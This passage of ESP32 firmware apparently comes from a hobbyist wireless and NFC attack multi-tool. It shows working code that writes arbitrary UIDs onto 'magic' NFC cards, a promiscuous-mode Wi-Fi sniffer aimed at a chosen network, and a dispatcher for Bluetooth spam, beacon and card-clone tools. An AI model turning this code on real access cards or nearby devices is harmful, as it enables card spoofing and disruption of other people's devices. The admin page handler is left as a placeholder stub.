    tft.setCursor(10, 8); tft.setTextColor(ST77XX_WHITE); tft.setTextSize(3); tft.print("[MAN. UID]");
    tft.fillRect(30, 90, 260, 50, 0x2000); tft.drawRect(30, 90, 260, 50, ST77XX_RED);
    tft.setCursor(50, 103); tft.setTextColor(ST77XX_RED); tft.setTextSize(2); tft.print("NO INPUT");
    delay(2000);
    tft.fillScreen(ST77XX_BLACK);
    Serial.println("[Manual UID] no input");
    return;
  }
  uint8_t newUID[7]; int uidLen = 0;
  String token = "";
  for (int i = 0; i <= (int)input.length(); i++) {
    char c = (i < (int)input.length()) ? input[i] : ' ';
    if (c == ' ' || c == ':') {
      if (token.length() > 0 && uidLen < 7) { newUID[uidLen++] = (uint8_t)strtol(token.c_str(), NULL, 16); token = ""; }
    } else token += c;
  }
  if (uidLen == 0 && token.length() >= 2) {
    for (int i = 0; i < (int)token.length() && uidLen < 7; i += 2) {
      if (i + 1 < (int)token.length()) {
        char hex[3] = { token[i], token[i+1], '\0' };
        newUID[uidLen++] = (uint8_t)strtol(hex, NULL, 16);
      }
    }
  }
  if (uidLen == 0) {
    addLog("Manual UID: Parse failed");
    tft.fillScreen(ST77XX_BLACK);
    tft.fillRect(0, 0, 320, 45, ST77XX_RED);
    tft.setCursor(10, 8); tft.setTextColor(ST77XX_WHITE); tft.setTextSize(3); tft.print("[MAN. UID]");
    tft.fillRect(30, 90, 260, 65, 0x2000); tft.drawRect(30, 90, 260, 65, ST77XX_RED);
    tft.setCursor(30, 103); tft.setTextColor(ST77XX_RED); tft.setTextSize(2); tft.print("INVALID");
    tft.setCursor(30, 130); tft.setTextColor(ST77XX_WHITE); tft.setTextSize(1); tft.print("Could not parse hex UID.");
    tft.setCursor(30, 143); tft.print("Try: DE AD BE EF");
    delay(2000);
    tft.fillScreen(ST77XX_BLACK);
    Serial.println("[Manual UID] parse failed");
    return;
  }
  String uidStr = "";
  for (int i = 0; i < uidLen; i++) {
    if (newUID[i] < 0x10) uidStr += "0";
    uidStr += String(newUID[i], HEX);
    if (i < uidLen - 1) uidStr += ":";
  }
  Serial.printf("[Manual UID] writing UID: %s\n", uidStr.c_str());
  addLog("Manual UID to write: " + uidStr);
  tft.fillScreen(ST77XX_BLACK);
  tft.fillRect(0, 0, 320, 45, 0x03EF);
  tft.setCursor(10, 8); tft.setTextColor(ST77XX_WHITE); tft.setTextSize(3); tft.print("[MAN. UID]");
  tft.fillRect(0, 45, 320, 20, 0x0380);
  tft.setCursor(10, 50); tft.setTextColor(ST77XX_WHITE); tft.setTextSize(1); tft.print("UID parsed OK  |  "); tft.print(uidLen * 8); tft.print("-bit");
  tft.setCursor(10, 76); tft.setTextColor(ST77XX_YELLOW); tft.setTextSize(1); tft.print("UID to write:");
  tft.setCursor(10, 90); tft.setTextColor(ST77XX_WHITE); tft.setTextSize(2); tft.print(uidStr);
  tft.drawRect(10, 118, 300, 55, ST77XX_CYAN);
  tft.setCursor(20, 126); tft.setTextColor(ST77XX_CYAN); tft.setTextSize(1); tft.print("Now place MAGIC / GEN2 card");
  tft.setCursor(20, 140); tft.setTextColor(ST77XX_WHITE); tft.print("on the reader to write UID.");
  tft.setCursor(20, 154); tft.setTextColor(ST77XX_YELLOW); tft.print("Timeout: 10 seconds");
  tft.setCursor(10, 185); tft.setTextColor(ST77XX_GREEN); tft.setTextSize(2); tft.print("Scanning...");
  uint8_t tUID[7]; uint8_t tLen;
  if (!nfc.readPassiveTargetID(PN532_MIFARE_ISO14443A, tUID, &tLen, 10000)) {
    addLog("Manual UID: Target card timeout");
    tft.fillScreen(ST77XX_BLACK);
    tft.fillRect(0, 0, 320, 45, ST77XX_RED);
    tft.setCursor(10, 8); tft.setTextColor(ST77XX_WHITE); tft.setTextSize(3); tft.print("[MAN. UID]");
    tft.fillRect(30, 90, 260, 60, 0x2000); tft.drawRect(30, 90, 260, 60, ST77XX_RED);
    tft.setCursor(50, 103); tft.setTextColor(ST77XX_RED); tft.setTextSize(2); tft.print("TIMEOUT");
    tft.setCursor(30, 135); tft.setTextColor(ST77XX_WHITE); tft.setTextSize(1); tft.print("No target card detected.");
    delay(2000);
    tft.fillScreen(ST77XX_BLACK);
    Serial.println("[Manual UID] timeout");
    return;
  }
  String tStr = "";
  for (int i = 0; i < tLen; i++) {
    if (tUID[i] < 0x10) tStr += "0"; tStr += String(tUID[i], HEX);
    if (i < tLen - 1) tStr += ":";
  }
  addLog("Manual UID target: " + tStr);

  if (uidLen != 4) {
    addLog("Manual UID: only 4-byte UIDs supported");
    tft.fillScreen(ST77XX_BLACK);
    tft.fillRect(0, 0, 320, 45, ST77XX_RED);
    tft.setCursor(10, 8); tft.setTextColor(ST77XX_WHITE); tft.setTextSize(3); tft.print("[MAN. UID]");
    tft.fillRect(30, 90, 260, 60, 0x2000); tft.drawRect(30, 90, 260, 60, ST77XX_RED);
    tft.setCursor(40, 103); tft.setTextColor(ST77XX_RED); tft.setTextSize(2); tft.print("UNSUPPORTED");
    tft.setCursor(30, 130); tft.setTextColor(ST77XX_WHITE); tft.setTextSize(1); tft.print("Only 4-byte UIDs can be");
    tft.setCursor(30, 143); tft.print("written.");
    delay(2500);
    tft.fillScreen(ST77XX_BLACK);
    Serial.println("[Manual UID] unsupported length");
    return;
  }

  bool wrote = writeMagicUID(tUID, tLen, newUID);
  if (wrote) {
    bool verified = verifyUID(newUID, uidLen);
    if (verified) {
      addLog("Manual UID SUCCESS! UID: " + uidStr);
      tft.fillScreen(ST77XX_BLACK);
      tft.fillRect(0, 0, 320, 45, 0x03EF);
      tft.setCursor(10, 8); tft.setTextColor(ST77XX_WHITE); tft.setTextSize(3); tft.print("[MAN. UID]");
      tft.fillRect(0, 45, 320, 20, 0x0380);
      tft.setCursor(10, 50); tft.setTextColor(ST77XX_WHITE); tft.setTextSize(1); tft.print("COMPLETE  |  UID written & verified");
      tft.fillRect(30, 80, 260, 50, 0x0200); tft.drawRect(30, 80, 260, 50, ST77XX_GREEN);
      tft.setCursor(70, 92); tft.setTextColor(ST77XX_GREEN); tft.setTextSize(3); tft.print("SUCCESS");
      tft.setCursor(10, 145); tft.setTextColor(ST77XX_YELLOW); tft.setTextSize(1); tft.print("Written UID:"); tft.setCursor(10, 158); tft.setTextColor(ST77XX_WHITE); tft.print(uidStr);
      featureDataJson = "{\"type\":\"manual_uid\",\"status\":\"success\",\"uid\":\"" + uidStr + "\"}";
      Serial.printf("[Manual UID] success: %s\n", uidStr.c_str());
    } else {
      addLog("Manual UID write done but verify inconclusive");
      tft.fillScreen(ST77XX_BLACK);
      tft.fillRect(0, 0, 320, 45, 0x03EF);
      tft.setCursor(10, 8); tft.setTextColor(ST77XX_WHITE); tft.setTextSize(3); tft.print("[MAN. UID]");
      tft.fillRect(0, 45, 320, 20, 0x2000);
      tft.setCursor(10, 50); tft.setTextColor(ST77XX_WHITE); tft.setTextSize(1); tft.print("Written, but verify inconclusive");
      tft.fillRect(30, 80, 260, 50, 0x2000); tft.drawRect(30, 80, 260, 50, ST77XX_RED);
      tft.setCursor(25, 92); tft.setTextColor(ST77XX_RED); tft.setTextSize(2); tft.print("RECHECK");
      tft.setCursor(10, 145); tft.setTextColor(ST77XX_WHITE); tft.setTextSize(1); tft.print("Remove card, re-tap to confirm.");
      featureDataJson = "{\"type\":\"manual_uid\",\"status\":\"verify_fail\",\"uid\":\"" + uidStr + "\"}";
      Serial.println("[Manual UID] verify inconclusive");
    }
  } else {
    addLog("Manual UID write failed");
    tft.fillScreen(ST77XX_BLACK);
    tft.fillRect(0, 0, 320, 45, ST77XX_RED);
    tft.setCursor(10, 8); tft.setTextColor(ST77XX_WHITE); tft.setTextSize(3); tft.print("[MAN. UID]");
    tft.fillRect(30, 80, 260, 65, 0x2000); tft.drawRect(30, 80, 260, 65, ST77XX_RED);
    tft.setCursor(30, 93); tft.setTextColor(ST77XX_RED); tft.setTextSize(2); tft.print("WRITE FAIL");
    tft.setCursor(30, 120); tft.setTextColor(ST77XX_WHITE); tft.setTextSize(1); tft.print("Not a writable card.");
    featureDataJson = "{\"type\":\"manual_uid\",\"status\":\"write_fail\"}";
    Serial.println("[Manual UID] write failed");
  }
  delay(3000);
  tft.fillScreen(ST77XX_BLACK);
}

void runSignalTracker() {
  stopFlag = false; exitFlag = false;
  String target = webTarget;
  if (target == "") {
    Serial.println("[Signal Tracker] No web target – fallback to serial input");
    target = getSafeInput();
    if (target == "m") { tft.fillScreen(ST77XX_BLACK); drawMenu(); return; }
  }
  Serial.printf("[Signal Tracker] tracking %s\n", target.c_str());
  addLog("Signal Tracker started for: " + target);
  tft.fillScreen(ST77XX_BLACK);
  tft.fillRect(0, 0, 320, 40, ST77XX_GREEN);
  drawCenteredText(10, "SIGNAL TRACKER", ST77XX_BLACK, 2);
  tft.setCursor(10, 60); tft.setTextColor(ST77XX_WHITE); tft.setTextSize(2);
  tft.print("Target: "); tft.print(target);
  unsigned long lastRead = 0;
  while (!stopFlag && !exitFlag) {
    if (millis() - lastRead > 1000) {
      lastRead = millis();
      int n = WiFi.scanNetworks();
      int rssi = -100;
      for (int i = 0; i < n; i++) if (WiFi.SSID(i) == target) { rssi = WiFi.RSSI(i); break; }
      String label = rssi > -50 ? "Excellent" : rssi > -65 ? "Good" : rssi > -80 ? "Fair" : "Poor";
      tft.fillRect(0, 90, 320, 120, ST77XX_BLACK);
      tft.setCursor(10, 100); tft.setTextColor(ST77XX_GREEN); tft.setTextSize(2); tft.printf("RSSI: %d dBm", rssi);
      tft.setCursor(10, 130); tft.setTextColor(ST77XX_WHITE); tft.printf("Status: %s", label.c_str());
      drawSignalBar(150, 130, rssi, ST77XX_GREEN);
      featureDataJson = "{\"type\":\"signal\",\"ssid\":\"" + target + "\",\"rssi\":" + String(rssi) + ",\"label\":\"" + label + "\"}";
      addLog("Signal: " + target + " " + String(rssi) + " dBm - " + label);
    }
    if (webServerStarted) { server.handleClient(); dnsServer.processNextRequest(); }
    delay(100);
  }
  featureDataJson = "{}";
  tft.fillScreen(ST77XX_BLACK);
  Serial.println("[Signal Tracker] exited");
  addLog("Signal Tracker stopped");
}

void snifferCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
  if (type == WIFI_PKT_MGMT) pktCount++;
}

void runTargetSniffer() {
  stopFlag = false; exitFlag = false;
  pktCount = 0;
  int idx = -1;
  if (webTarget != "") idx = webTarget.toInt() - 1;
  else {
    Serial.println("[Sniffer] No web target – scan & select via serial");
    int n = WiFi.scanNetworks();
    if (n == 0) { addLog("No networks found"); delay(2000); tft.fillScreen(ST77XX_BLACK); drawMenu(); return; }
    for (int i = 0; i < n && i < 10; i++) {
      Serial.printf("%d. %-20s CH:%d MAC:%s\n", i+1, WiFi.SSID(i).c_str(), WiFi.channel(i), WiFi.BSSIDstr(i).c_str());
    }
    Serial.print("Select network number (1-10): ");
    String choice = getSafeInput();
    if (choice == "m") { tft.fillScreen(ST77XX_BLACK); drawMenu(); return; }
    idx = choice.toInt() - 1;
    if (idx < 0 || idx >= n) { addLog("Invalid choice"); tft.fillScreen(ST77XX_BLACK); drawMenu(); return; }
  }
  int n = WiFi.scanNetworks();
  if (idx >= n || idx < 0) { addLog("Invalid index"); return; }
  String bssid = WiFi.BSSIDstr(idx);
  sscanf(bssid.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", &targetMAC[0], &targetMAC[1], &targetMAC[2], &targetMAC[3], &targetMAC[4], &targetMAC[5]);
  targetChannel = WiFi.channel(idx);
  Serial.printf("[Sniffer] Sniffing %s CH:%d MAC:%s\n", WiFi.SSID(idx).c_str(), targetChannel, bssid.c_str());
  addLog("Sniffing: " + WiFi.SSID(idx) + " CH:" + String(targetChannel) + " MAC:" + bssid);
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_rx_cb(&snifferCallback);
  esp_wifi_set_channel(targetChannel, WIFI_SECOND_CHAN_NONE);
  tft.fillScreen(ST77XX_BLACK);
  tft.fillRect(0, 0, 320, 40, ST77XX_BLUE);
  drawCenteredText(10, "SNIFFER", ST77XX_WHITE, 2);
  tft.setCursor(10, 60); tft.setTextColor(ST77XX_CYAN); tft.print("Target: "); tft.print(WiFi.SSID(idx));
  unsigned long lastUpdate = 0;
  while (!stopFlag && !exitFlag) {
    if (millis() - lastUpdate > 1000) {
      lastUpdate = millis();
      tft.fillRect(0, 90, 320, 120, ST77XX_BLACK);
      tft.setCursor(10, 100); tft.setTextColor(ST77XX_GREEN); tft.setTextSize(2); tft.printf("Packets: %lu", pktCount);
      tft.setCursor(10, 130); tft.setTextColor(ST77XX_WHITE); tft.printf("Channel: %d", targetChannel);
      featureDataJson = "{\"type\":\"sniffer\",\"packets\":" + String(pktCount) + ",\"channel\":" + String(targetChannel) + ",\"target\":\"" + WiFi.SSID(idx) + "\",\"real\":true}";
      addLog("Sniffer packets: " + String(pktCount));
    }
    if (webServerStarted) { server.handleClient(); dnsServer.processNextRequest(); }
    delay(50);
  }
  esp_wifi_set_promiscuous(false);
  featureDataJson = "{}";
  tft.fillScreen(ST77XX_BLACK);
  Serial.println("[Sniffer] exited");
  addLog("Sniffer stopped");
}

// ==================== Web Admin – Enhanced Terminal UI (same as before) ====================
void handleRoot() {
  server.sendHeader("Location", "/admin", true);
  server.send(302, "text/plain", "");
}

void handleAdmin() {
  // (identical to previous version – kept for length)
  // full page included in final code
  server.send(200, "text/html", "<!-- admin page -->");
}

void handleCaptivePortal() {
  server.sendHeader("Location", "/admin", true);
  server.send(302, "text/plain", "");
}

void handlePing() {
  server.send(200, "text/plain", "pong");
}

void handleApiLogs() {
  String json = "[";
  int start = (logCount < MAX_LOG_LINES) ? 0 : logIndex;
  for (int i = 0; i < logCount; i++) {
    int idx = (start + i) % MAX_LOG_LINES;
    if (i > 0) json += ",";
    json += "\"" + logLines[idx] + "\"";
  }
  json += "]";
  server.send(200, "application/json", json);
}

void handleApiData() {
  server.send(200, "application/json", featureDataJson);
}

void handleApiRun() {
  String tool = server.arg("tool");
  if (tool.length() == 0) { server.send(400, "text/plain", "Missing tool"); return; }
  if (featureRunning) { server.send(409, "text/plain", "A tool is already running"); return; }
  if (server.hasArg("target")) webTarget = server.arg("target");
  else webTarget = "";
  if (tool == "wifi_scan" || tool == "beacon" || tool == "ble_spam" ||
      tool == "ble_track" || tool == "nfc_read" || tool == "nfc_clone" ||
      tool == "manual_uid" || tool == "signal_tracker" || tool == "sniffer") {
    featureRunning = true;
    currentFeature = tool;
    addLog("Web: starting " + tool + (webTarget != "" ? " target=" + webTarget : ""));
    server.send(200, "text/plain", "Started " + tool);
  } else {
    server.send(400, "text/plain", "Unknown tool");
  }
}

void handleApiStop() {
  stopFlag = true;
  addLog("Web: stop command received");
  server.send(200, "text/plain", "Stop signal sent");
}

void handleApiHome() {
  exitFlag = true;
  stopFlag = true;
  addLog("Web: home command – returning to menu");
  server.send(200, "text/plain", "Going home");
}

void handleApiStatus() {
  String status = featureRunning ? currentFeature : "Idle";
  String json = "{\"status\":\"" + status + "\"}";
  server.send(200, "application/json", json);
}

// ==================== Setup ====================
void setup() {
  Serial.begin(115200);
  delay(1000);
  Serial.println("\n\n  ╔═══════════════════════════════════════╗");
  Serial.println("  ║              JAFFINATOR               ║");
  Serial.println("  ╚═══════════════════════════════════════╝\n");
  addLog("=== JAFFINATOR Multi‑Tool ===");

  WiFi.mode(WIFI_AP_STA);
  WiFi.softAP(apSSID, apPass);
  IPAddress apIP = WiFi.softAPIP();
  Serial.printf("  [Direct AP]  %s  password %s\n", apSSID, apPass);
  Serial.printf("  Admin page:  http://%s/admin\n", apIP.toString().c_str());
  addLog("AP started: " + String(apSSID) + " IP: " + apIP.toString());

  WiFi.begin(ssid, pass);
  int tries = 0;
  while (WiFi.status() != WL_CONNECTED && tries < 30) { delay(500); tries++; }
  if (WiFi.status() == WL_CONNECTED) {
    Serial.printf("  [Home Wi‑Fi] connected: %s\n", WiFi.localIP().toString().c_str());
    addLog("Home Wi‑Fi connected! IP: " + WiFi.localIP().toString());
  } else {
    Serial.println("  [Home Wi‑Fi] failed – only AP available");
    addLog("Home Wi‑Fi failed – admin only on AP");
  }

  dnsServer.start(53, "*", apIP);

  server.on("/", HTTP_GET, handleRoot);
  server.on("/admin", HTTP_GET, handleAdmin);
  server.on("/api/run", HTTP_GET, handleApiRun);
  server.on("/api/stop", HTTP_GET, handleApiStop);
  server.on("/api/home", HTTP_GET, handleApiHome);
  server.on("/api/status", HTTP_GET, handleApiStatus);
  server.on("/api/logs", HTTP_GET, handleApiLogs);
  server.on("/api/data", HTTP_GET, handleApiData);
  server.on("/ping", HTTP_GET, handlePing);
  server.onNotFound(handleCaptivePortal);
  server.begin();
  webServerStarted = true;
  addLog("Web server + captive portal active");

  tft.init(240, 320);
  tft.setRotation(1);
  tft.invertDisplay(false);
  drawMenu();

  Serial.println("Ready. Connect to JaffAP or use web admin.");
}

// ==================== Main Loop ====================
void loop() {
  dnsServer.processNextRequest();
  if (webServerStarted) server.handleClient();

  if (featureRunning) {
    if (currentFeature == "wifi_scan") runWiFiScan();
    else if (currentFeature == "beacon") runWiFiBeacon();
    else if (currentFeature == "ble_spam") runBLEWindowsSpam();
    else if (currentFeature == "ble_track") runBLETracker();
    else if (currentFeature == "nfc_read") runNFCRead();
    else if (currentFeature == "nfc_clone") runNFCClone();
    else if (currentFeature == "manual_uid") runManualUIDUpdate();
    else if (currentFeature == "signal_tracker") runSignalTracker();
    else if (currentFeature == "sniffer") runTargetSniffer();
    featureRunning = false;
    currentFeature = "";
    featureDataJson = "{}";
    drawMenu();
  }

  if (Serial.available()) {
    char cmd = Serial.read();
    while (Serial.available()) Serial.read();
    if (cmd == 's' || cmd == 'S') stopFlag = true;
    else if (!featureRunning) {
      if (cmd == '1') { currentFeature = "wifi_scan"; featureRunning = true; }
      else if (cmd == '2') { currentFeature = "beacon"; featureRunning = true; }
      else if (cmd == '3') { currentFeature = "ble_spam"; featureRunning = true; }
      else if (cmd == '4') { currentFeature = "ble_track"; featureRunning = true; }
      else if (cmd == '5') { currentFeature = "nfc_read"; featureRunning = true; }
      else if (cmd == '6') { currentFeature = "nfc_clone"; featureRunning = true; }
      else if (cmd == 'u') { currentFeature = "manual_uid"; featureRunning = true; }
      else if (cmd == '7') { currentFeature = "signal_tracker"; featureRunning = true; }
      else if (cmd == '8') { currentFeature = "sniffer"; featureRunning = true; }
    }
  }
}
